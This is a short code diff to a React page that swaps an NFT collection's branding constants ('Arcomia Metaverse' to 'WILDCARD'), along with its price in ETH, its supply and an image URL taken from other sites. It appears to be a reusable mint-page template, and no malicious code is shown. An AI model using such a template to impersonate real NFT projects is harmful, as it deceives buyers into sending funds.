@@ -3,10 +3,10 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = '14.5'
-const image = 'https://pbs.twimg.com/profile_images/1635680321931735045/qQjL-MiZ_400x400.png'
-const Title = 'Arcomia Metaverse'
-const supply = 1250
+const ethAmount = '99'
+const image = 'https://img-cdn.magiceden.dev/rs:fill:400:400:0:0/plain/https://bafybeicxyslsiuozo62lu4342i56rdk6rdi5dglzke6d3wxquneptjbcki.ipfs.nftstorage.link/'
+const Title = 'WILDCARD'
+const supply = 99
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
